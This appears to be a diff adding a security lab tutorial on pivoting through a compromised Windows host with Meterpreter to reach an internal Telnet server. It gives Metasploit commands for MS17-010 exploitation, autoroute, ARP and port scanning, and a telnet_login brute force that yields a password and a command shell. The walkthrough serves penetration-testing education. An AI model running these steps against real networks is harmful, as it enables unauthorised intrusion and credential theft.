@@ -1,0 +1,61 @@
+
+Telnet Pivoting through Meterpreter
+
+In our previous tutorial we had discussed on SSH pivoting and today we are going to discuss Telnet pivoting.
+From Offensive Security
+Pivoting is technique to get inside an unreachable network with help of pivot (centre point). In simple words it is an attack through which attacker can exploit those system which belongs to different network. For this attack, the attacker needs to exploit the main server that helps the attacker to add himself inside its local network and then attacker will able to target the client system for attack.
+Lab Setup requirement:
+Attacker machine: Kali Linux
+Pivot Machine (client): window operating system with two network interface
+Target Machine: Ubuntu server (Allow telnet service)
+
+Exploit pivot machine
+Use exploit MS17-010 or multi handler to hack the pivot machine.
+sessions
+From given image you can confirm that I owned pivot machine (192.168.1.107) meterpreter session1.
+
+Check network interface through following command:
+Meterpreter> ifconfig
+From given image you can observe two networks interface in pivot’s system 1st for IP 192.168.1.107 through which attacker is connected and 2nd for IP 10.0.0.20 through which telnet server (targets) are connected.
+
+Since attacker belongs to 192.168.1.1 interface and target belongs to 10.0.0.0 interface therefore it is not possible to directly make attack on target network until unless the attacker acquires same network connection. In order to achieve 10.0.0.0 network attacker need run the post exploitation “autoroute”.
+use post/multi/manage/autoroute 
+msf post(autoroute) > set session 1
+msf post(autoroute) > exploit
+
+This Module will perform an ARP scan for a given IP range through a Meterpreter Session.
+use post/windows/gather/arp_scanner
+msf post(arp_scanner) > set rhosts 10.0.0.1-30
+msf post(arp_scanner) > set session 1
+msf post(arp_scanner) > set thread 20
+msf post(arp_scanner) > exploit
+ Here we found a new IP 10.0.0.10 as shown in given image. Let’s perform TCP port scan for activated services on this machine.
+
+This module Enumerates open TCP services by performing a full TCP connect on each port. This does not need administrative privileges on the source machine, which may be useful if pivoting.
+use auxiliary/scanner/portscan/tcp
+msf auxiliary(tcp) > set ports 23
+msf auxiliary(tcp) > set rhosts 10.0.0.1
+msf auxiliary(tcp) > set thread 10
+msf auxiliary(tcp) >exploit
+From given you can observe port 23 is open and we know that port 23 is used for telnet service.
+
+An attacker always tries to make brute force attack for stealing credential for unauthorized access.
+This module will test a telnet login on a range of machines and report successful logins. If you have loaded a database plugin and connected to a database this module will record successful logins and hosts so you can track your access.
+Now type following command to Brute force TELNET login:
+use auxiliary/scanner/telnet/telnet_login
+msf auxiliary(telnet_login) > set rhosts 10.0.0.10
+msf auxiliary(telnet_login) > set user_file /root/Desktop/user.txt
+msf auxiliary(telnet_login) > set pass_file /root/Desktop/pass.txt
+msf auxiliary(telnet_login) > exploit
+From given image you can observe that TELNET server is not secure against brute force attack because it is showing matching combination of username: aarti and password: 123 for login simultaneously it has opened victims command shell as session 2
+
+Let’s count the number of victim sessions we have hold using following command:
+sessions
+From given image you can observe there are two sessions 1st as meterpreter session of windows system and 2nd as command shell of telnet server.
+
+sessions 2
+Now attacker is command shell of server, let’s verify through network configuration.
+Ifconfig
+From given you can observe the network IP is 10.0.0.10
+
+ Author: AArti Singh is a Researcher and Technical Writer at Hacking Articles an Information Security Consultant Social Media Lover and Gadgets. Contact here
